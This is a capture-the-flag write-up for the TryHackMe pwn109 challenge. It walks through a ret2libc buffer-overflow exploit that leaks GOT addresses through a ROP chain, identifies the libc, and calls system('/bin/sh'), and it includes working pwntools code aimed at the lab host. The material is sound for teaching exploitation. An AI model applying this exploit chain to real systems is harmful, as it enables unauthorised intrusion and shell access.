# [Exploiting Return2Libc - pwn09](https://tryhackme.com/room/pwn101)

## Challenge Overview   
  - The challenge involves exploiting a buffer overflow vulnerability, use ROP techinique
  - Goal: Excuting `call_system` with parameter `\bin\sh`

## Initial Analysis 
  - Use checksec tool to know type of this binary<br>
  > <img width="378" height="192" alt="image" src="https://github.com/user-attachments/assets/8ff611e2-4bb9-446a-9f2f-a70d7ae649a3" />
  -> we saw this binary have fixed base address (NO PIE) and 64-bit structure<br>
  - If I put a long input to this binary, it will be crashed<br>
    <img width="697" height="193" alt="image" src="https://github.com/user-attachments/assets/3fd57585-48f8-4c58-b767-b5ee895d0417" /> <br>
    -> it means that there has a vulnerability 
  - We need know how GOT (Global Offset Table) and PLT (Procedure Linkage Table) work together 
    1. GOT
      - it holds actual memory address (pointers). It means that when a function from external library loaded into the memory, its address is written here
      - because of ASLR (Address Space Layout Randomization), external library locations change everytime each execution
    2. PLT
      - it contains small stubs of code for each external function that the binary calls
      - the code stub inside the PLT consists a jump instruction pointing to the corresponding slot in the GOT
   
## Planning To Access Shell  
  - One of ways to know address `system` or address of string `\bin\sh`, we know what library is used
  - Because in a same library, GOT's address of any function is related to each others
  - So if we know of what library is used and address of anyone function, we can know other functions' address (`system`) or some string address (like `\bin\sh`) 

## Strategy To Execute Expected Function 
  - First, we need to find actual address of `puts()` function in the binary; because of `NO PIE`, this address is fixed
  - Use of this function is same as `printf()`, we will use it to leak address
  - I can get this address as follow :
    `plt_puts_address = p64(binary.plt.puts)`

  - About what library is, I can leak some GOT's addresses of some functions and find their library; because if we have their address, we can use this [Libc Finding Tool](https://libc.blukat.me/) to get our goal
  - To find these addresses, we use ROP technique to leak them with `puts@plt` we got above
    - I will use `ROPgadget Tool` to find one `pop rdi; ret`
      ```
      ROPgadget --binary ./pwn109-1644300507645.pwn109 > gadgets.txt
      ```
      <img width="879" height="231" alt="image" src="https://github.com/user-attachments/assets/df7741c3-c3a4-4436-99aa-2f740b3db03c" />

    - In pwn tool of python, we can find location of pointer of a function in the GOT, then we need use `puts@plt` to print actual address stored at that location; we will combine them with ROP to make the payload  
      ```
      plt_puts_address = p64(binary.plt.puts) 
      got_puts_address = p64(binary.got.puts)
      got_gets_address = p64(binary.got.gets)
      got_setvbuf_address = p64(binary.got.setvbuf)
      
      payload = b'A' * 0x20 + b'B' * 0x8 
      
      payload += pop_rdi_ret + got_puts_address + plt_puts_address
      payload += pop_rdi_ret + got_gets_address + plt_puts_address
      payload += pop_rdi_ret + got_setvbuf_address + plt_puts_address
      ```

  - We will execute the binary with input is `payload`, I have a python code to do that
    ```py
    from pwn import * 

    context.binary = binary = ELF("./pwn109-1644300507645.pwn109")

    plt_puts_address = p64(binary.plt.puts) 
    got_puts_address = p64(binary.got.puts)
    got_gets_address = p64(binary.got.gets)
    got_setvbuf_address = p64(binary.got.setvbuf)
    
    payload = b'A' * 0x20 + b'B' * 0x8 
    
    payload += pop_rdi_ret + got_puts_address + plt_puts_address
    payload += pop_rdi_ret + got_gets_address + plt_puts_address
    payload += pop_rdi_ret + got_setvbuf_address + plt_puts_address

    p = remote("10.49.163.195", 9009)
    p.recvuntil(b"ahead")
    p.recvline() 
    p.sendline(payload)
    output = []
    output.append(p.recvline())
    output.append(p.recvline())
    output.append(p.recvline())
    
    leaked_puts_address = u64(output[0].strip().ljust(8, b"\x00"))
    leaked_gets_address = u64(output[1].strip().ljust(8, b"\x00"))
    leaked_setvbuf_address = u64(output[2].strip().ljust(8, b"\x00"))
    
    print("Leaked puts address {}".format(str(hex(leaked_puts_address))))
    print("Leaked gets address {}".format(str(hex(leaked_gets_address))))
    print("Leaked setvbuf address {}".format(str(hex(leaked_setvbuf_address))))
    ```
    -> The result is :<br>
    <img width="683" height="109" alt="image" src="https://github.com/user-attachments/assets/feb21f5f-710c-4e49-8059-6d05ca108718" />

  - We will copy 4-last number of each address and paste them into [Libc Finding Tool](https://libc.blukat.me/) (corresponding with their function); we will get :<br>
    <img width="800" height="300" alt="image" src="https://github.com/user-attachments/assets/fd497cb6-60d6-4f64-b335-f5792e2491fd" />
  - So we see that some libc that match with our leak addresses; choose one of them, pick a function as the base and we see offset of other function or string in this libc<br>
    <img width="550" height="300" alt="image" src="https://github.com/user-attachments/assets/3b03cfaf-ac62-4527-85ee-7e8d3e298e5b" />
  - Now, we knew the particular addresses of `system` and `str_bin_sh` in the libc that the binary use
    ```py
    '''
    when puts address is the base address 
    system :  	-0x32190
    str_bin_sh : 0x13019d
    '''
    
    system_address = p64(leaked_puts_address -0x32190)
    str_bin_sh = p64(leaked_puts_address + 0x13019d)
    ```
  - We do ROP technique again; first, we need to run the `main` once more time to pass new input (because of `NO PIE`, we can add the address of `main` to previous payload and when the binary is executed, after leaking, the `rip` (Instruction Pointer Register) will get back to `main` entry
    ```py
    payload_2 = b'A' * 0x20 + b'B' * 0x8 
    payload_2 += ret_address + pop_rdi_ret + str_bin_sh + system_address
    
    p.recvuntil(b"ahead")
    p.recvline() 
    p.sendline(payload_2)
    p.interactive() 
    ```


